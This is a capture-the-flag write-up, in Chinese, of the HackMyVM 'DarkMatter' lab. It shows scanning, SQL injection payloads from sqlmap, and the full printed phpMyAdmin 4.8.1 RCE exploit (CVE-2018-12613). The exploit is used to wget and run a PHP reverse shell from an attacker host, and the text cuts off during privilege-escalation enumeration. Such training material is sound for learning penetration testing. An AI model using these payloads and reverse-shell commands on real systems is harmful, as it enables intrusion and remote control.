---
title: DarkMatter
author: hgbe02
date: 2024-08-09 09:02:00 +0800
categories: [Training platform,Hackmyvm]  
tags: [Hackmyvm,web]  
permalink: "/Hackmyvm/DarkMatter.html"
---

# DarkMatter

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859072.png" alt="image-20240712183521190" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859074.png" alt="image-20240808075827072" style="zoom:50%;" />

## 信息搜集

### 端口扫描

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ rustscan -a $IP -- -sCV 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 172.20.10.6:22
Open 172.20.10.6:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 54:42:86:67:e3:5b:74:e1:87:9c:4d:80:0a:59:f3:4d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/810ntjvY+YKXdq1kS0tvwqkjPh5sOOZykJ9UwHRV6IxhocPDvUEbe5NQrYyuRX619/5n1+Rd1JTpBU4y5jkmF8ioqWColdaUnXJKeo8zGd8g/Jmc86hQuqT4//fIc/bhttQzjAQXGdasZnYK3Ro4tomYPZ1Jer9lge01rivQJIJhyst4iXFlJN7PqkLmuDrSOaM5ul7zQ9ffT2765rLiOKe74bYivwRmT3o+ktdx9OCsKfKQ1lNYdHoF/+2hqAEvcYhljd+kO7MYRpFZq1S8Vx+GaX4rxsFwknYrSv2BRM7eGTpukW/6Liy1FQe699mXgpEr4/mK8VxKpXjgtzMsBWWenFB8EwEgHzWYx6YywiCG6yRr2IQfJ8pptyt8dEe18hjRlklIc6q4QlrLJD6YFPblvmSU4Y6cQVb8fkn8Y3kI4NoPpMrDFVSPT9ruqcdq7qv0CyCJMFqJo0J+cjipsA1FoRmoRiVdRV/Ere0lMYF0Y6OPmueDJWyzVahuruE=
|   256 b8:ae:fd:d6:01:e8:e4:0f:63:74:7c:ea:20:ac:fe:80 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK/xU10I7Yc0KCO970yMzJv0Sqyhwlv+J2PL1roiJHyHxq/DY71BX2m6PMvpiOlynikdFUBL7goPSpqhWTBAb9g=
|   256 f6:40:de:a2:c3:ec:2f:e0:f0:b9:76:21:3e:ee:a7:5d (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINH3mv5b7iZ2z8NoJ773/GrtGBCMgLymD0GbAXI4UWn/
80/tcp open  http    syn-ack Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 目录扫描

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -b 301,401,403,404                 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.6
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301,401,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/robots.txt           (Status: 200) [Size: 14]
Progress: 39466 / 661683 (5.96%)[ERROR] Get "http://172.20.10.6/index_4": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.6/Install.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.6/prodotti.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 206416 / 661683 (31.20%)[ERROR] Get "http://172.20.10.6/navbottom_corner.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.6/namevoyager.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://172.20.10.6/navbottom_corner": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 238605 / 661683 (36.06%)[ERROR] Get "http://172.20.10.6/tattoo-removal.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 248356 / 661683 (37.53%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 248412 / 661683 (37.54%)
===============================================================
Finished
===============================================================
```

## 漏洞发现

### 踩点

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ curl -s http://$IP | html2text

[Debian Logo]  Apache2 Debian Default Page
It works!
This is the default welcome page used to test the correct operation of the
Apache2 server after installation on Debian systems. If you can read this page,
it means that the Apache HTTP server installed at this site is working
properly. You should replace this file (located at /var/www/html/index.html)
before continuing to operate your HTTP server.
........
```

### 敏感目录探索

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ curl -s http://$IP/robots.txt 
/p4ssw0rd.txt

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ curl -s http://$IP/p4ssw0rd.txt
Here is the Password = th3-!llum!n@t0r

Don't forget to add "darkmatter.hmv" in your local Machine
```

### 信息搜集

添加dns解析，重新扫描一下：

```text
172.20.10.6   darkmatter.hmv
```

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ gobuster dir -u http://darkmatter.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 301,401,403,404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://darkmatter.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   301,401,403,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 14]
Progress: 109078 / 882244 (12.36%)[ERROR] Get "http://darkmatter.hmv/sergey.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/sergey": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 110783 / 882244 (12.56%)[ERROR] Get "http://darkmatter.hmv/ITN_button.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/yahoo-shopping_120x60": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/4986": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/4986.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/4986.html": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://darkmatter.hmv/ITN_button": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 143617 / 882244 (16.28%)
```

懒得扫了，继续：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ curl -s http://darkmatter.hmv | html2text

[Debian Logo]  Apache2 Debian Default Page
It works!
This is the default welcome page used to test the correct operation of the
Apache2 server after installation on Debian systems. If you can read this page,
it means that the Apache HTTP server installed at this site is working
properly. You should replace this file (located at /var/www/html/index.html)
before continuing to operate your HTTP server.
If you are a normal user of this web site and don't know what this page is
about, this probably means that the site is currently unavailable due to
maintenance. If the problem persists, please contact the site's administrator.
Configuration Overview
```

尝试 fuzz 一下dns：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ wfuzz -u http://darkmatter.hmv -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.darkmatter.hmv" --hw 933 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://darkmatter.hmv/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                     
=====================================================================
000005051:   200        57 L     128 W      2481 Ch     "dark"
000009532:   400        10 L     35 W       301 Ch      "#www"
000010581:   400        10 L     35 W       301 Ch      "#mail"
000047706:   400        10 L     35 W       301 Ch      "#smtp"
000103135:   400        10 L     35 W       301 Ch      "#pop3"

Total time: 209.3793
Processed Requests: 114441
Filtered Requests: 114436
Requests/sec.: 546.5726
```

尝试添加dns进行进一步扫描：

```text
172.20.10.6   dark.darkmatter.hmv
```

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ gobuster dir -u http://dark.darkmatter.hmv -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt -b 301,401,403,404
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dark.darkmatter.hmv
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   401,403,404,301
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2481]
/blog.php             (Status: 200) [Size: 8433]
/home.php             (Status: 200) [Size: 4459]
/register.php         (Status: 200) [Size: 5602]
/login.php            (Status: 200) [Size: 4117]
/header.php           (Status: 200) [Size: 272]
/profile.php          (Status: 302) [Size: 3692] [--> login.php]
/footer.php           (Status: 200) [Size: 350]
/update.php           (Status: 302) [Size: 644] [--> login.php]
/status.php           (Status: 302) [Size: 3225] [--> login.php]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/navbar.php           (Status: 200) [Size: 1766]
/manage.php           (Status: 302) [Size: 4045] [--> login.php]
Progress: 19853 / 661683 (3.00%)[ERROR] Get "http://dark.darkmatter.hmv/stunnel.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dark.darkmatter.hmv/current_affairs.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dark.darkmatter.hmv/969.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dark.darkmatter.hmv/969.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
[ERROR] Get "http://dark.darkmatter.hmv/current_affairs": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 25750 / 661683 (3.89%)
[!] Keyboard interrupt detected, terminating.
Progress: 25777 / 661683 (3.90%)
===============================================================
Finished
===============================================================
```

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ whatweb http://dark.darkmatter.hmv
http://dark.darkmatter.hmv [200 OK] Apache[2.4.51], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.51 (Debian)], IP[172.20.10.6], JQuery, Script, Title[Demooo]
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859076.png" alt="image-20240808092403527" style="zoom: 33%;" />

尝试注册一下：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859077.png" alt="image-20240808092538103" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859078.png" alt="image-20240808092559176" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859079.png" alt="image-20240808092718164" style="zoom: 50%;" />

也不行，应该不会真要找个邮箱搞吧，试试本地邮箱？

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859080.png" alt="image-20240808092928277" style="zoom:50%;" />

发现成功了，尝试登录。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859081.png" alt="image-20240808093009458" style="zoom:50%;" />

在blog找到了一些用户名，看起来像是名人名言，暂时先不用，看一下敏感目录：

```bash
# http://dark.darkmatter.hmv/navbar.php
没东西
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859082.png" alt="image-20240808093513408" style="zoom:33%;" />

### sql注入

尝试看一下相关信息，点一下update：

```text
http://dark.darkmatter.hmv/update.php?id=5
```

尝试进行注入（手动试了几下没出来），这个工具和sqlmap一样，只是因为差生文具多，哈哈哈：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ ghauri -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=c5nvi9jb2jfjfsf1lq403snpns" --batch 
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=5' AND 02477=2477-- wXyW

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
    Payload: id=5'XOR(if(now()=sysdate(),SLEEP(8),0))XOR'Z
---

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=c5nvi9jb2jfjfsf1lq403snpns" --batch
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=5' AND 5111=5111 AND 'BHBW'='BHBW

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5' AND (SELECT 6907 FROM (SELECT(SLEEP(5)))SUJr) AND 'Wzgo'='Wzgo

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=5' UNION ALL SELECT NULL,CONCAT(0x7178707071,0x485a426d6f59676875437859506c52746a736642624a6d7069504a676f466a4f4a504d4a4c684c74,0x7178767a71),NULL,NULL,NULL,NULL-- -
---

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=c5nvi9jb2jfjfsf1lq403snpns" --batch --dbs
available databases [4]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] phpmyadmin

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=c5nvi9jb2jfjfsf1lq403snpns" --batch -D phpmyadmin --tables
+------------------------+
| pma__bookmark          |
| pma__central_columns   |
| pma__column_info       |
| pma__designer_settings |
| pma__export_templates  |
| pma__favorite          |
| pma__history           |
| pma__navigationhiding  |
| pma__pdf_pages         |
| pma__recent            |
| pma__relation          |
| pma__savedsearches     |
| pma__table_coords      |
| pma__table_info        |
| pma__table_uiprefs     |
| pma__tracking          |
| pma__userconfig        |
| pma__usergroups        |
| pma__users             |
+------------------------+

# sqlmap -u "http://dark.darkmatter.hmv/update.php?id=5" --cookie "PHPSESSID=c5nvi9jb2jfjfsf1lq403snpns" --batch -D phpmyadmin -T pma__userconfig --dump
+----------+---------------------+-------------------------------+
| username | timevalue           | config_data                   |
+----------+---------------------+-------------------------------+
| pam      | 2021-11-14 05:58:36 | {"Console\\/Mode":"collapse"} |
+----------+---------------------+-------------------------------+
```

发现存在 phpmyadmin，找到一个用户名，尝试登录：

```text
pam
th3-!llum!n@t0r
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859083.png" alt="image-20240808100403692" style="zoom:50%;" />

看一下版本号`4.8.1`，看一下是否有漏洞，这个组件也是重灾区。。

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ searchsploit phpmyadmin 4.8.1
----------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (1)                                                                                                | php/webapps/44924.txt
phpMyAdmin 4.8.1 - (Authenticated) Local File Inclusion (2)                                                                                                | php/webapps/44928.txt
phpMyAdmin 4.8.1 - Remote Code Execution (RCE)                                                                                                             | php/webapps/50457.py
----------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No Results

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ searchsploit -m php/webapps/50457.py
  Exploit: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50457
     Path: /usr/share/exploitdb/exploits/php/webapps/50457.py
    Codes: CVE-2018-12613
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/temp/DarkMatter/50457.py

┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ cat 50457.py                                                                            
# Exploit Title: phpMyAdmin 4.8.1 - Remote Code Execution (RCE)
# Date: 17/08/2021
# Exploit Author: samguy
# Vulnerability Discovery By: ChaMd5 & Henry Huang
# Vendor Homepage: http://www.phpmyadmin.net
# Software Link: https://github.com/phpmyadmin/phpmyadmin/archive/RELEASE_4_8_1.tar.gz
# Version: 4.8.1
# Tested on: Linux - Debian Buster (PHP 7.3)
# CVE : CVE-2018-12613

#!/usr/bin/env python

import re, requests, sys

# check python major version
if sys.version_info.major == 3:
  import html
else:
  from six.moves.html_parser import HTMLParser
  html = HTMLParser()

if len(sys.argv) < 7:
  usage = """Usage: {} [ipaddr] [port] [path] [username] [password] [command]
Example: {} 192.168.56.65 8080 /phpmyadmin username password whoami"""
  print(usage.format(sys.argv[0],sys.argv[0]))
  exit()

def get_token(content):
  s = re.search('token"\s*value="(.*?)"', content)
  token = html.unescape(s.group(1))
  return token

ipaddr = sys.argv[1]
port = sys.argv[2]
path = sys.argv[3]
username = sys.argv[4]
password = sys.argv[5]
command = sys.argv[6]

url = "http://{}:{}{}".format(ipaddr,port,path)

# 1st req: check login page and version
url1 = url + "/index.php"
r = requests.get(url1)
content = r.content.decode('utf-8')
if r.status_code != 200:
  print("Unable to find the version")
  exit()

s = re.search('PMA_VERSION:"(\d+\.\d+\.\d+)"', content)
version = s.group(1)
if version != "4.8.0" and version != "4.8.1":
  print("The target is not exploitable".format(version))
  exit()

# get 1st token and cookie
cookies = r.cookies
token = get_token(content)

# 2nd req: login
p = {'token': token, 'pma_username': username, 'pma_password': password}
r = requests.post(url1, cookies = cookies, data = p)
content = r.content.decode('utf-8')
s = re.search('logged_in:(\w+),', content)
logged_in = s.group(1)
if logged_in == "false":
  print("Authentication failed")
  exit()

# get 2nd token and cookie
cookies = r.cookies
token = get_token(content)

# 3rd req: execute query
url2 = url + "/import.php"
# payload
payload = '''select '<?php system("{}") ?>';'''.format(command)
p = {'table':'', 'token': token, 'sql_query': payload }
r = requests.post(url2, cookies = cookies, data = p)
if r.status_code != 200:
  print("Query failed")
  exit()

# 4th req: execute payload
session_id = cookies.get_dict()['phpMyAdmin']
url3 = url + "/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_{}".format(session_id)
r = requests.get(url3, cookies = cookies)
if r.status_code != 200:
  print("Exploit failed")
  exit()

# get result
content = r.content.decode('utf-8', errors="replace")
s = re.search("select '(.*?)\n'", content, re.DOTALL)
if s != None:
  print(s.group(1))
```

18年的洞，靶场是21年的，可能是这个，尝试一下：

```bash
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ python3 50457.py 172.20.10.6 80 /phpmyadmin pam 'th3-!llum!n@t0r' whoami
www-data
```

可以执行系统命令，尝试反弹shell。

```bash
# python3 50457.py 172.20.10.6 80 /phpmyadmin pam 'th3-!llum!n@t0r' 'whoami;id'
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# python3 50457.py 172.20.10.6 80 /phpmyadmin pam 'th3-!llum!n@t0r' 'cat /etc/passwd'      
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
darkenergy:x:1000:1000:DarkEnergy,,,:/home/darkenergy:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
```

尝试反弹shell：

```bash
# kali
┌──(kali💀kali)-[~/temp]
└─$ python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
172.20.10.6 - - [07/Aug/2024 22:26:34] "GET /revshell.php HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.

┌──(kali💀kali)-[~/temp]
└─$ head revshell.php                                                  

  <?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net

  set_time_limit (0);
  $VERSION = "1.0";
  $ip = '172.20.10.8';  // You have changed this
  $port = 1234;  // And this
  $chunk_size = 1400;
```

```bash
# attacked
┌──(kali💀kali)-[~/temp/DarkMatter]
└─$ python3 50457.py 172.20.10.6 80 /phpmyadmin pam 'th3-!llum!n@t0r' 'cd /tmp;wget http://172.20.10.8:8888/revshell.php;chmod +x revshell.php;php revshell.php'
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202408090859084.png" alt="image-20240808102745706" style="zoom:50%;" />

## 提权

### 信息搜集

```bash
(remote) www-data@DarkMatter:/$ ls -la
total 68
drwxr-xr-x  18 root root  4096 Nov 10  2021 .
drwxr-xr-x  18 root root  4096 Nov 10  2021 ..
lrwxrwxrwx   1 root root     7 Nov 10  2021 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Nov 10  2021 boot
drwxr-xr-x  17 root root  3140 Aug  7 19:57 dev
drwxr-xr-x  78 root root  4096 Aug  7 19:57 etc
drwxr-xr-x   3 root root  4096 Nov 10  2021 home
lrwxrwxrwx   1 root root    30 Nov 10  2021 initrd.img -> boot/initrd.img-5.10.0-9-amd64
lrwxrwxrwx   1 root root    30 Nov 10  2021 initrd.img.old -> boot/initrd.img-5.10.0-9-amd64
lrwxrwxrwx   1 root root     7 Nov 10  2021 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Nov 10  2021 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Nov 10  2021 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Nov 10  2021 libx32 -> usr/libx32
drwx------   2 root root 16384 Nov 10  2021 lost+found
drwxr-xr-x   3 root root  4096 Nov 10  2021 media
drwxr-xr-x   2 root root  4096 Nov 10  2021 mnt
drwxr-xr-x   2 root root  4096 Nov 21  2021 opt
dr-xr-xr-x 149 root root     0 Aug  7 19:56 proc
drwx------   4 root root  4096 Nov 20  2021 root
drwxr-xr-x  19 root root   540 Aug  7 19:57 run
lrwxrwxrwx   1 root root     8 Nov 10  2021 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 Nov 13  2021 srv
dr-xr-xr-x  13 root root     0 Aug  7 19:56 sys
drwxrwxrwt   2 root root  4096 Aug  7 22:26 tmp
drwxr-xr-x  14 root root  4096 Nov 10  2021 usr
drwxr-xr-x  12 root root  4096 Nov 13  2021 var
lrwxrwxrwx   1 root root    27 Nov 10  2021 vmlinuz -> boot/vmlinuz-5.10.0-9-amd64
lrwxrwxrwx   1 root root    27 Nov 10  2021 vmlinuz.old -> boot/vmlinuz-5.10.0-9-amd64
(remote) www-data@DarkMatter:/$ sudo -l
[sudo] password for www-data: 
Sorry, try again.
[sudo] password for www-data: 
sudo: 1 incorrect password attempt
(remote) www-data@DarkMatter:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/chfn
(remote) www-data@DarkMatter:/$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
(remote) www-data@DarkMatter:/$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

然后上传pspy64看一下：

```bash
(remote) www-data@DarkMatter:/tmp$ wget http://172.20.10.8:8888/lpspy64;chmod +x lpspy64
```

啥都没发现，尝试查看一下其他信息，上传`linpeas.sh`。

```bash
(remote) www-data@DarkMatter:/tmp$ wget http://172.20.10.8:8888/linpeas.sh;chmod +x linpeas.sh
```

发现找到了奇怪的东西：

```bash
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
Sudoers file: /etc/sudoers.d/darkenergy is readable
darkenergy rettaMkraD = (root) NOPASSWD: /bin/bash
```

这玩意可读。。。。。

```bash
(remote) www-data@DarkMatter:/etc/sudoers.d$ cat /etc/group |  grep darkenergy
cdrom:x:24:darkenergy
floppy:x:25:darkenergy
audio:x:29:darkenergy
dip:x:30:darkenergy
video:x:44:darkenergy
plugdev:x:46:darkenergy
netdev:x:109:darkenergy
bluetooth:x:112:darkenergy
darkenergy:x:1000:
```

这个`rettaMkraD`感觉是`DarkMatter`，抽象。。。。

```bash
(remote) www-data@DarkMatter:/$ find / -group darkenergy 2>/dev/null
/home/darkenergy
/opt/note.txt
/var/lib/sudo/lectured/darkenergy

(remote) www-data@DarkMatter:/$ cat /opt/note.txt
www-data can read root's important.txt file but idk how ;(
```

看一下是否存在其他特殊权限，发现没有`Acls`以及`doas`之类的，尝试搞其他的：

```bash
(remote) www-data@DarkMatter:/$ cd /opt
(remote) www-data@DarkMatter:/opt$ ls -la 
total 2444
drwxr-xr-x  2 root       root          4096 Nov 21  2021 .
drwxr-xr-x 18 root       root          4096 Nov 10  2021 ..
-rwxrwxr--  1 darkenergy darkenergy      59 Nov 14  2021 note.txt
-rwxrwxrwx  1 root       root       2489009 Nov 21  2021 website.zip
(remote) www-data@DarkMatter:/opt$ cp website.zip /tmp/
(remote) www-data@DarkMatter:/opt$ cd /tmp
(remote) www-data@DarkMatter:/tmp$ unzip website.zip 
......
(remote) www-data@DarkMatter:/tmp$ ls
darkmatter  linpeas.sh  lpspy64  revshell.php  website.zip
(remote) www-data@DarkMatter:/tmp$ cd darkmatter/
(remote) www-data@DarkMatter:/tmp/darkmatter$ ls -la
total 92
drwxr-x--x 6 www-data www-data 4096 Nov 21  2021 .
drwxrwxrwt 3 root     root     4096 Aug  7 23:01 ..
